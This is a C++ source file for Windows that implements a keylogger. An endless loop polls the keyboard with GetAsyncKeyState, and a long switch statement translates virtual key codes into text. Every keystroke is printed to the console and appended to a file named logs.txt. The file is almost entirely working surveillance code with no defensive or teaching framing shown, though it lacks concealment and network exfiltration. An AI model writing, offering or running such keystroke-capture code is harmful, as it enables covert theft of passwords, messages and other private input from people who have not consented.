#include <Windows.h>
#include <iostream>
#include <fstream>
#include <stdio.h>
#include <string>

using namespace std;

void writeToLog(LPCSTR text) {
    ofstream logfile; //creates object for file stream
    logfile.open("logs.txt", fstream::app); //open file for writing
    logfile << text; // writes text string to file
    logfile.close(); //Closes stream
}

bool keyIsListed(int ikey) {
    switch(ikey) {
case 0xC1: //Abnt C1
cout << "*Abnt C1*";
writeToLog("*Abnt C1*");
break;
case 0xC2: //Abnt C2
cout << "*Abnt C2*";
writeToLog("*Abnt C2*");
break;
case VK_ADD: //Numpad +
cout << "+";
writeToLog("+");
break;
case VK_MULTIPLY: //Numpad *
cout << "*";
writeToLog("*");
break;
case VK_DIVIDE: //Numpad /
cout << "/";
writeToLog("/");
break;
case VK_ATTN: //Attn
cout << "*Attn*";
writeToLog("*Attn*");
break;          
case VK_BACK:
cout << "*Back*";
writeToLog("*Back*");
break;
case VK_CANCEL:
cout << "*Cancel*";
writeToLog("*Cancel*");
break;
case VK_CLEAR: //Clear
cout << "*Clear*";
writeToLog("*Clear*");
break;
case VK_CRSEL:
cout << "*CRSel*";
writeToLog("*CRSel*");
break;
case VK_DECIMAL:
cout << ".";
writeToLog(".");
break;
case VK_EREOF:
cout << "VK_EREOF";
writeToLog("VK_EREOF");
break;
case VK_ESCAPE:
cout << "*Escape*";
writeToLog("*Escape*");
break;
case VK_EXECUTE:
cout << "exec";
writeToLog("exec");
break;
case VK_EXSEL:
cout << "exs";
writeToLog("exs");
break;
case VK_ICO_CLEAR:
cout << "ico_clear";
writeToLog("ico_clear");
break;
case VK_ICO_HELP:
cout << "ico_help";
writeToLog("ico_help");
break;
case 0x30: //0
cout << "0";
writeToLog("0");
break;
case 0x31 : //1
cout << "1";
writeToLog("1");
break;
case 0x32: //2
cout << "2";
writeToLog("2");
break;
case 0x33:
cout << "3";
writeToLog("3");
break;
case 0x34:
cout << "4";
writeToLog("4");
break;
case 0x35:
cout << "5";
writeToLog("5");
break;
case 0x36:
cout << "6";
writeToLog("6");
break;
case 0x37:
cout << "7";
writeToLog("7");
break;
case 0x38:
cout << "8";
writeToLog("8");
break;
case 0x39:
cout << "9";
writeToLog("9");
break;
case 0x41:
cout << "a";
writeToLog("a");
break;
case 0x42:
cout << "b";
writeToLog("b");
break;
case 0x43:
cout << "c";
writeToLog("c");
break;
case 0x44:
cout << "d";
writeToLog("d");
break;
case 0x45:
cout << "e";
writeToLog("e");
break;
case 0x46:
cout << "f";
writeToLog("f");
break;
case 0x47:
cout << "g";
writeToLog("g");
break;
case 0x48:
cout << "h";
writeToLog("h");
break;
case 0x49:
cout << "i";
writeToLog("i");
break;
case 0x4A:
cout << "j";
writeToLog("j");
break;
case 0x4B:
cout << "k";
writeToLog("k");
break;
case 0x4C:
cout << "l";
writeToLog("l");
break;
case 0x4D:
cout << "m";
writeToLog("m");
break;
case 0x4E:
cout << "n";
writeToLog("n");
break;
case 0x4F:
cout << "o";
writeToLog("o");
break;
case 0x50:
cout << "p";
writeToLog("p");
break;
case 0x51:
cout << "q";
writeToLog("q");
break;
case 0x52:
cout << "r";
writeToLog("r");
break;
case 0x53:
cout << "s";
writeToLog("s");
break;
case 0x54:
cout << "t";
writeToLog("t");
break;
case 0x55:
cout << "u";
writeToLog("u");
break;
case 0x56:
cout << "v";
writeToLog("v");
break;
case 0x57:
cout << "w";
writeToLog("w");
break;
case 0x58:
cout << "x";
writeToLog("x");
break;
case 0x59:
cout << "y";
writeToLog("y");
break;
case 0x5A:
cout << "z";
writeToLog("z");
break;

case VK_NONAME:
cout << "*No name*";
writeToLog("*No name*");
break; 
case VK_NUMPAD0:
cout << "0";
writeToLog("0");
break; 
case VK_NUMPAD1: 
cout << "1";
writeToLog("1");
break;
case VK_NUMPAD2: 
cout << "2";
writeToLog("2");
break;
case VK_NUMPAD3:
cout << "3";
writeToLog("3");
break; 
case VK_NUMPAD4: 
cout << "4";
writeToLog("4");
break;
case VK_NUMPAD5:
cout << "5";
writeToLog("5");
break;
case VK_NUMPAD6:
cout << "6";
writeToLog("6");
break; 
case VK_NUMPAD7: 
cout << "7";
writeToLog("7");
break;
case VK_NUMPAD8:
cout << "8";
writeToLog("8");
break;
case VK_NUMPAD9:
cout << "9";
writeToLog("9");
break; 
case VK_OEM_1: //OEM_1 (: ;)
cout << ";/:";
writeToLog(";/:");
break;
case VK_OEM_102: //OEM_102 (> <)
cout << "<>";
writeToLog("<>");
break;
case VK_OEM_2: ///OEM_2 (? /)
cout << "? /";
writeToLog("? /");
break;
case VK_OEM_3: ///OEM_3 (~ `)
cout << "~ `";
writeToLog("~ `");
break;
case VK_OEM_4: ///OEM_4 ({ [)
cout << "{ [";
writeToLog("{ [");
break;
case VK_OEM_5: ///OEM_5 (| )
cout << "|";
writeToLog("|");
break;
case VK_OEM_6: ///OEM_6 (} ])
cout << "} ]";
writeToLog("} ]");
break;
case VK_OEM_7: ///OEM_7 (" ')
cout << "\" '";
writeToLog("\" '");
break;
case VK_OEM_8: ///OEM_8 (§ !)
cout << "§ !";
writeToLog("§ !");
break;
case VK_OEM_ATTN: //Oem Attn
cout << "Oem Attn";
writeToLog("Oem Attn");
break;
case VK_OEM_AUTO: //Auto
cout << "Oem Auto";
writeToLog("Oem Auto");
break;
case VK_OEM_AX: //Ax
cout << "Oem Ax";
writeToLog("Oem Ax");
break;
case VK_OEM_BACKTAB: //Back Tab
cout << "Oem Back Tab";
writeToLog("Oem Back Tab");
break;
case VK_OEM_CLEAR: //OemClr
cout << "Oem Clear";
writeToLog("Oem Clear");
break;
case VK_OEM_COMMA: //OEM_COMMA (< ,)
cout << "< , ";
writeToLog("< , ");
break;
case VK_OEM_COPY: //Copy
cout << "Copy";
writeToLog("Copy");
break;
case VK_OEM_CUSEL: //Cu Sel
cout << "Cu sel";
writeToLog("Cu Sel");
break;
case VK_OEM_ENLW: //Enlw
cout << "Enlw";
writeToLog("Enlw");
break;
case VK_OEM_FINISH: //Finish
cout << "Finish";
writeToLog("Finish");
break;
case VK_OEM_FJ_LOYA: //Loya
cout << "Loya";
writeToLog("Loya");
break;
case VK_OEM_FJ_MASSHOU: //Mashu
cout << "Mashu";
writeToLog("Mashu");
break;
case VK_OEM_FJ_ROYA: //Roya
cout << "Roya";
writeToLog("Roya");
break;
case VK_OEM_FJ_TOUROKU: //Touroku
cout << "Touroku";
writeToLog("Touroku");
break;
case VK_OEM_JUMP: //Jump
cout << " ";
writeToLog(" ");
break;  
case VK_OEM_MINUS: //OEM_MINUS (_ -)
cout << "_ -";
writeToLog("_ -");
break;
case VK_OEM_PA1: //OemPa1
cout << "OemPa1";
writeToLog("OemPa1");
break;
case VK_OEM_PA2: //OemPa2
cout << "OemPa2";
writeToLog("OemPa2");
break;
case VK_OEM_PA3: //OemPa3
cout << "OemPa3";
writeToLog("OemPa3");
break;
case VK_OEM_PERIOD: //OEM_PERIOD (> .)
cout << "> .";
writeToLog("> .");
break;
case VK_OEM_PLUS:  //OEM_PLUS (+ =)
cout << "+ =";
writeToLog("+ =");
break;
case VK_OEM_RESET:  //Reset
cout << "reset";
writeToLog("reset");
break;
case VK_OEM_WSCTRL:  //WsCtrl
cout << "wsctrl";
writeToLog("wsctrl");
break;
case VK_PA1: //Pa1
cout << "pa1";
writeToLog("pa1");
break;
case VK_PACKET: //Packet
cout << "packet";
writeToLog("packet");
break;
case VK_PLAY: //Play
cout << "play";
writeToLog("play");
break;
case VK_PROCESSKEY: //Process
cout << "process";
writeToLog("process");
break;
case VK_RETURN: //Enter
cout << "\n";
writeToLog("\n");
break;
case VK_SELECT: //Select
cout << "select";
writeToLog("select");
break;
case VK_SEPARATOR: //Separator
cout << "Separator";
writeToLog("Separator");
break;
case VK_SPACE: //Space
cout << " ";
writeToLog(" ");
break;
case VK_SUBTRACT: //Num -
cout << "-";
writeToLog("-");
break;
case VK_TAB: //Tab
cout << "   ";
writeToLog("    ");
break;
case VK_ZOOM: //Zoom
cout << "zoom";
writeToLog("zoom");
break;
case 0: //no VK mapping
cout << "no mapping";
writeToLog("no mapping");
break;
case VK_ACCEPT: // Accept
cout << "accept";
writeToLog("accept");
break;
case VK_APPS: //Context Menu
cout << "context menu";
writeToLog("context menu");
break;
case VK_BROWSER_FAVORITES: //Browser Favorites
cout << "browser favorites";
writeToLog("browser favorites");
break;
case VK_BROWSER_FORWARD: //Browser Forward
cout << "browser forward";
writeToLog("browser forward");
break;
case VK_BROWSER_HOME: //Browser Home
cout << "browser home";
writeToLog("browser home");
break;
case VK_BROWSER_REFRESH: //Browser Refresh
cout << "browser refresh";
writeToLog("browser refresh");
break;
case VK_BROWSER_SEARCH: //Browser Search
cout << "browser search";
writeToLog("browser search");
break;
case VK_BROWSER_STOP: //Browser Stop
cout << "browser Stop";
writeToLog("browser Stop");
break;
case VK_CAPITAL: //Caps Lock
cout << "*caps lock*";
writeToLog("*caps lock");
break;
case VK_CONVERT: // Convert
cout << "*convert*";
writeToLog("*convert");
break;
case VK_DELETE: //Delete
cout << "*delete*";
writeToLog("*delete");
break;
case VK_DOWN: //Arrow Down
cout << "*Arrow Down*";
writeToLog("*Arrow Down*");
break;
case VK_UP: //Arrow Up
cout << "*Arrow Up*";
writeToLog("*Arrow Up*");
break;  
case VK_RIGHT:
cout << "*Arrow Right*";
writeToLog("*Arrow Right*");
break;
case VK_LEFT:
cout << "*Arrow Left*";
writeToLog("*Arrow Left*");
break;
case VK_END: //End
cout << "*End*";
writeToLog("*End*");
break;
case VK_F1: //F1
cout << "*F1*";
writeToLog("*F1*");
break;
case VK_F2: //F2
cout << "*F2*";
writeToLog("*F2*");
break;
case VK_F3: //F3
cout << "*F3*";
writeToLog("*F3*");
break;
case VK_F4: //F4
cout << "*F4*";
writeToLog("*F4*");
break;
case VK_F5: //F5
cout << "*F5*";
writeToLog("*F5*");
break;
case VK_F6: //F6
cout << "*F6*";
writeToLog("*F6*");
break;
case VK_F7: //F7
cout << "*F7*";
writeToLog("*F7*");
break;
case VK_F8: //F8
cout << "*F8*";
writeToLog("*F8*");
break;
case VK_F9: //F9
cout << "*F9*";
writeToLog("*F9*");
break;
case VK_F10: //F10
cout << "*F10*";
writeToLog("*F10*");
break;
case VK_F11: //F11
cout << "*F11*";
writeToLog("*F11*");
break;
case VK_F12: //F12
cout << "*F12*";
writeToLog("*F12*");
break;
case VK_F13: //F13
cout << "*F13*";
writeToLog("*F13*");
break;
case VK_F14: //F14
cout << "*F14*";
writeToLog("*F14*");
break;
case VK_F15: //F15
cout << "*F15*";
writeToLog("*F15*");
break;
case VK_F16: //F16
cout << "*F16*";
writeToLog("*F16*");
break;
case VK_F17: //F17
cout << "*F17*";
writeToLog("*F17*");
break;
case VK_F18: //F18
cout << "*F18*";
writeToLog("*F18*");
break;
case VK_F19: //F19
cout << "*F19*";
writeToLog("*F19*");
break;
case VK_F20: //F20
cout << "*F20*";
writeToLog("*F20*");
break;
case VK_F21: //F21
cout << "*F21*";
writeToLog("*F21*");
break;
case VK_F22: //F22
cout << "*F22*";
writeToLog("*F22*");
break;
case VK_F23: //F23
cout << "*F23*";
writeToLog("*F23*");
break;
case VK_F24: //F24
cout << "*F24*";
writeToLog("*F24*");
break;
case VK_FINAL: //Final
cout << "*Final*";
writeToLog("*Final*");
break;
case VK_HELP: //Help
cout << "*HELP*";
writeToLog("*HELP*");
break;
case VK_HOME: //Home
cout << "*Home*";
writeToLog("*Home*");
break;
case VK_ICO_00: //Ico00 *
cout << "*Ico00*";
writeToLog("*Ico00*");
break;
case VK_INSERT: //Insert
cout << "*Insert*";
writeToLog("*Insert*");
break;
case VK_JUNJA: //Junja
cout << "*Junja*";
writeToLog("*Junja*");
break;
case VK_KANA: //Kana
cout << "Kana";
writeToLog("Kana");
break;
case VK_KANJI: //Kanji
cout << "Kanji";
writeToLog("Kanji");
break;
case VK_LAUNCH_APP1: //App1
cout << "LAUNCH_APP1";
writeToLog("LAUNCH_APP1");
break;
case VK_LAUNCH_APP2: //App2
cout << "LAUNCH_APP2";
writeToLog("LAUNCH_APP2");
break;
case VK_LAUNCH_MAIL: //Mail
cout << "*Launch mail*";
writeToLog("*Launch mail*");
break;
case VK_LAUNCH_MEDIA_SELECT: //Media
cout << "*Launch media";
writeToLog("*Launch media*");
break;
case VK_LBUTTON: // Left Button **
cout << "*Left button*";
writeToLog("*Left button*");
break;
case VK_RBUTTON: //Right button
cout << "*Right button*";
writeToLog("*Right button*");
break;
case VK_LCONTROL: // Left Ctrl
cout << "*Ctrl*";
writeToLog("*Ctrl*");
break;
case VK_RCONTROL: // Right Ctrl
cout << "*Ctrl*";
writeToLog("*Ctrl*");
break;
case VK_LMENU: // Left Alt
cout << "*Alt*";
writeToLog("*Alt*");
break;
case VK_RMENU: // Right Alt
cout << "*Alt*";
writeToLog("*Alt*");
break;
case VK_LSHIFT: // Left Shift
cout << "*Shift*";
writeToLog("*Shift*");
break;
case VK_RSHIFT: // Right Shift
cout << "*Shift*";
writeToLog("*Shift*");
break;
case VK_LWIN: // Left Win
cout << "*Win*";
writeToLog("*Win*");
break;
case VK_RWIN: // Right Win
cout << "*Win*";
writeToLog("*Win*");
break;
case VK_MBUTTON: // Middle Button **
cout << "*Middle mouse button*";
writeToLog("*Middle mouse button*");
break;
case VK_MEDIA_NEXT_TRACK: // Next Track
cout << "*Next Track*";
writeToLog("*Next Track*");
break;
case VK_MEDIA_PLAY_PAUSE: // Play / Pause
cout << "*Play / Pause*";
writeToLog("*Play / Pause*");
break;
case VK_MEDIA_PREV_TRACK: // Previous Track
cout << "*Previous Track*";
writeToLog("*Previous Track*");
break;
case VK_MEDIA_STOP: //Stop
cout << "*Stop*";
writeToLog("*Stop*");
break;
case VK_MODECHANGE: // Mode Change
cout << "*Mode Change*";
writeToLog("*Mode Change*");
break;
case VK_NEXT: // Page Down
cout << "*Page Down*";
writeToLog("*Page Down*");
break;
case VK_PRIOR: //Page Up
cout << "*Page Up*";
writeToLog("*Page Up*");
break;
case VK_NONCONVERT: // Non Convert
cout << "*Non Convert*";
writeToLog("*Non Convert*");
break;
case VK_NUMLOCK: //Num Lock
cout << "*Num Lock*";
writeToLog("*Num Lock*");
break;
case VK_OEM_FJ_JISHO: //Jisho
cout << "Jisho";
writeToLog("Jisho");
break;
case VK_PAUSE: //Pause
cout << "*Pause*";
writeToLog("*Pause*");
break;
case VK_PRINT: //Print
cout << "*Print*";
writeToLog("*Print*");
break;
case VK_SCROLL: // Scrol Lock
cout << "*Scroll lock*";
writeToLog("*Scroll lock*");
break;
case VK_SLEEP: //Sleep
cout << "*Sleep*";
writeToLog("*Sleep*");
break;
case VK_SNAPSHOT: // Print Screen
cout << "*Print Screen*";
writeToLog("*Print Screen*");
break;
case VK_VOLUME_DOWN	: // Volume Down
cout << "*Volume Down*";
writeToLog("*Volume Down*");
break;
case VK_VOLUME_MUTE	: // Volume Mute
cout << "*Volume Mute*";
writeToLog("*Volume Mute*");
break;
case VK_VOLUME_UP: // Volume Up
cout << "*Volume Up*";
writeToLog("*Volume Up*");
break;
case VK_XBUTTON1: // X Button 1 **
cout << "X button 1";
writeToLog("X button 1");
break;
case VK_XBUTTON2: // X Button 2 **
cout << "X button 2";
writeToLog("X button 2");
break;
case 0x8000: //?
cout << "?";
writeToLog("?");
break;
default: return false;
break;
}
    return true;
}

int main() {
    char key;

    while(TRUE) {
        Sleep(10);
        for(key = 8; key <= 190; key++) {
            if(GetAsyncKeyState(key) == -32767) {
                if(keyIsListed(key) == FALSE) {
                    cout << key;
                    ofstream logfile; //creates object for file stream
                    logfile.open("logs.txt", fstream::app); //open file for writing
                    logfile << key; //writes the logged key char to file
                    logfile.close(); //Closes stream
                }
            }
        }
    }
    return 0;
}
